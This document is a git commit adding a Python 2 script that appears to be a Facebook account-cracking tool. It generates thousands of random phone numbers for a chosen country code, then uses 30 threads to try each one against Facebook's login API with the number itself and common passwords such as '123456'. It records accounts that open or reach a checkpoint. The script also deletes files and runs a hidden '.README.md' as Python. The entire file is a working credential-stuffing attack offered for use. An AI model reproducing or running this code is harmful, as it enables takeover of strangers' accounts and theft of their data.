c1f01c9a6ce429601a59479940a189a4117ca75c
BLACK-KILLER <63947251+ShuBhamg0sain@users.noreply.github.com>
2020-11-04 08:07:43 +0530

    Create W.py

---
+++ BLACK/KILLER/W.py
@@ -0,0 +1,397 @@
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
+os.system('rm -rf .txt')
+for n in range(10000):
+    nmbr = random.randint(1111111, 9999999)
+    sys.stdout = open('login.txt', 'a')
+    print nmbr
+    sys.stdout.flush()
+
+try:
+    import requests
+except ImportError:
+    os.system('pip2 install requests')
+
+try:
+    import mechanize
+except ImportError:
+    os.system('pip2 install mechanize')
+    time.sleep(1)
+    os.system('python2 nmbr.py')
+
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+
+def exb():
+    print '[!] Exit'
+    os.sys.exit()
+
+
+def psb(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+
+
+def t():
+    time.sleep(1)
+
+
+def cb():
+    os.system('clear')
+
+
+logo = '\n\x1b[1;97m--------------------------------------------------\n\x1b[1;95m\n CREATER     : MAFIA-KILLER\n WHATSAPP NO   : +92132197796\n NOT     : DON,T CALL ME ONLY TEXT\n\x1b[1;37m--------------------------------------------------                                '
+back = 0
+successful = []
+cpb = []
+oks = []
+id = []
+
+def menu():
+    os.system('clear')
+    print logo
+    print
+    print '\x1b[1;90m               [1]\x1b[1;96m  Bangladesh'
+    print '\x1b[1;91m               [2]\x1b[1;93m  USA'
+    print '\x1b[1;94m               [3]\x1b[1;92m  UK'
+    print '\x1b[1;92m               [4] \x1b[1;97m India'
+    print '\x1b[1;93m               [5]\x1b[1;94m  Brazil'
+    print '\x1b[1;94m               [6]\x1b[1;95m  Japan'
+    print '\x1b[1;95m               [7]\x1b[1;98m  Korea'
+    print '\x1b[1;96m               [8]\x1b[1;99m  Italy'
+    print '\x1b[1;97m               [9]\x1b[1;96m  Spain'
+    print '\x1b[1;98m               [10]\x1b[1;92m Poland'
+    print '\x1b[1;99m               [11]\x1b[1;96m Pakistan'
+    print '\x1b[1;90m               [12]\x1b[1;95m Indonisia'
+    print '\x1b[1;91m               [13]\x1b[1;91m Update Tool'
+    print '                [0]\x1b[1;97m  Exit            '
+
+    action()
+
+
+def action():
+    global cpb
+    global oks
+    bch = raw_input('\n\x1b[1;95m\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90[CHOOSE ANY COUNTRY NUMBER> ☝')
+    if bch == '':
+        print '[!] Fill in correctly'
+        action()
+    elif bch == '1':
+        os.system('clear')
+        print logo
+        print '\x1b[1;93m175,165,191, 192, 193, 194, 195, 196, 197, 198, 199'
+        try:
+            c = raw_input('\x1b[1;96m choose code  : ')
+            k = '+880'
+            idlist = 'login.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif bch == '2':
+        os.system('clear')
+        print logo
+        print '786, 815, 315, 256, 401, 718, 917, 202, 701, 303, 703, 803, 999, 708'
+        try:
+            c = raw_input(' choose code  : ')
+            k = '+1'
+            idlist = 'login.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif bch == '3':
+        os.system('clear')
+        print logo
+        print '737, 706, 748, 783, 739, 759, 790'
+        try:
+            c = raw_input(' choose code  : ')
+            k = '+44'
+            idlist = 'login.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif bch == '4':
+        os.system('clear')
+        print logo
+        print '954, 897, 967, 937, 700, 727, 965, 786, 874, 856, 566, 590, 527, 568, 578'
+        try:
+            c = raw_input(' choose code  : ')
+            k = '+91'
+            idlist = 'login.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif bch == '5':
+        os.system('clear')
+        print logo
+        print '127, 179, 117, 853, 318, 219, 834, 186, 479, 113'
+        try:
+            c = raw_input(' choose code  : ')
+            k = '+55'
+            idlist = 'login.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif bch == '6':
+        os.system('clear')
+        print logo
+        print '11, 12, 19, 16, 15, 13, 14, 18, 17'
+        try:
+            c = raw_input(' choose code  : ')
+            k = '+81'
+            idlist = 'login.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif bch == '7':
+        os.system('clear')
+        print logo
+        print '1, 2, 3, 4, 5, 6, 7, 8, 9'
+        try:
+            c = raw_input(' choose code  : ')
+            k = '+82'
+            idlist = 'login.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif bch == '8':
+        os.system('clear')
+        print logo
+        print '388, 390, 391, 371, 380, 368, 386, 384, 332, 344, 351, 328'
+        try:
+            c = raw_input(' choose code  : ')
+            k = '+39'
+            idlist = 'login.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif bch == '9':
+        os.system('clear')
+        print logo
+        print '60, 76, 73, 64, 69, 77, 65, 61, 75, 68'
+        try:
+            c = raw_input(' choose code  : ')
+            k = '+34'
+            idlist = 'login.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif bch == '10':
+        os.system('clear')
+        print logo
+        print '66, 69, 78, 79, 60, 72, 67, 53, 51'
+        try:
+            c = raw_input(' choose code  : ')
+            k = '+48'
+            idlist = 'login.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif bch == '11':
+        os.system('clear')
+        print logo
+        print '\x1b[1;93m01, ~to~~, 49'
+        try:
+            c = raw_input(' choose code  : ')
+            k = '03'
+            idlist = 'login.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif bch == '12':
+        os.system('clear')
+        print logo
+        print '\x1b[1;93m81,83,85,84,89,'
+        try:
+            c = raw_input(' choose code  : ')
+            k = '+1'
+            idlist = 'login.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif bch == '13':
+        os.system('xdg-open https://www.youtube.com')
+        login()
+    elif bch == '0':
+        exb()
+    else:
+        print '[!] Fill in correctly'
+        action()
+    xxx = str(len(id))
+    psb('[\xe2\x9c\x93] Total Numbers: ' + xxx)
+    time.sleep(0.5)
+    psb('\x1b[1;91m[\xe2\x9c\x93]\x1b[1;94m Please wait, process is running ...')
+    time.sleep(0.5)
+    psb('[!] To Stop Process Press CTRL Then Press z')
+    time.sleep(0.5)
+    print
+
+    def main(arg):
+        user = arg
+        try:
+            os.mkdir('save')
+        except OSError:
+            pass
+
+        try:
+            pass1 = user
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;32mSuccessful  ' + k + c + user + '  |  ' + pass1
+                okb = open('login.txt', 'a')
+                okb.write(k + c + user + pass1 + '\n')
+                okb.close()
+                oks.append(c + user + pass1)
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\x1b[1;31mCheckpoint ' + k + c + user + '  |  ' + pass1
+                cps = open('login.txt', 'a')
+                cps.write(k + c + user + pass1 + '\n')
+                cps.close()
+                cpb.append(c + user + pass1)
+            else:
+                pass2 = '786786'
+                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                q = json.load(data)
+                if 'access_token' in q:
+                    print '\x1b[1;32mSuccessful  ' + k + c + user + '  |  ' + pass2
+                    okb = open('login.txt', 'a')
+                    okb.write(k + c + user + pass2 + '\n')
+                    okb.close()
+                    oks.append(c + user + pass2)
+                elif 'www.facebook.com' in q['error_msg']:
+                    print '\x1b[1;31mCheckpoint ' + k + c + user + '  |  ' + pass2
+                    cps = open('login.txt', 'a')
+                    cps.write(k + c + user + pass2 + '\n')
+                    cps.close()
+                    cpb.append(c + user + pass2)
+                else:
+                    pass3 = '000786'
+                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                    q = json.load(data)
+                    if 'access_token' in q:
+                        print '\x1b[1;32mSuccessful  ' + k + c + user + '  |  ' + pass3
+                        okb = open('login.txt', 'a')
+                        okb.write(k + c + user + pass3 + '\n')
+                        okb.close()
+                        oks.append(c + user + pass3)
+                    elif 'www.facebook.com' in q['error_msg']:
+                        print '\x1b[1;31mCheckpoint ' + k + c + user + '  |  ' + pass3
+                        cps = open('login.txt', 'a')
+                        cps.write(k + c + user + pass3 + '\n')
+                        cps.close()
+                        cpb.append(c + user + pass3)
+                    else:
+                        pass4 = '123456'
+                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                        q = json.load(data)
+                        if 'access_token' in q:
+                            print '\x1b[1;32mSuccessful  ' + k + c + user + '  |  ' + pass4
+                            okb = open('login.txt', 'a')
+                            okb.write(k + c + user + pass4 + '\n')
+                            okb.close()
+                            oks.append(c + user + pass4)
+                        elif 'www.facebook.com' in q['error_msg']:
+                            print '\x1b[1;31mCheckpoint ' + k + c + user + '  |  ' + pass4
+                            cps = open('login.txt', 'a')
+                            cps.write(k + c + user + pass4 + '\n')
+                            cps.close()
+                            cpb.append(c + user + pass4)
+                        else:
+                            pass5 = '786786786'
+                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                            q = json.load(data)
+                            if 'access_token' in q:
+                                print '\x1b[1;32mSuccessful  ' + k + c + user + '  |  ' + pass5
+                                okb = open('login.txt', 'a')
+                                okb.write(k + c + user + pass5 + '\n')
+                                okb.close()
+                                oks.append(c + user + pass5)
+                            elif 'www.facebook.com' in q['error_msg']:
+                                print '\x1b[1;31mCheckpoint ' + k + c + user + '  |  ' + pass5
+                                cps = open('login.txt', 'a')
+                                cps.write(k + c + user + pass5 + '\n')
+                                cps.close()
+                                cpb.append(c + user + pass5)
+        except:
+            pass
+
+    p = ThreadPool(30)
+    p.map(main, id)
+    print '\x1b[1;96m\xe2\x8a\xb1\xe2\x8b\x95\xe2\x8a\xb0\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x8a\xb1\xe2\x8b\x95\xe2\x8a\xb0'
+    print '[\xe2\x9c\x93] Process Has Been Completed ....'
+    print '[\xe2\x9c\x93] Total OK/CP : ' + str(len(oks)) + '/' + str(len(cpb))
+    print '[\xe2\x9c\x93] CP File Has Been Saved : save/checkpoint.txt'
+    raw_input('\n[Press Enter To Go Back]')
+    os.system('python2 .README.md')
+
+
+if __name__ == '__main__':
+    menu()
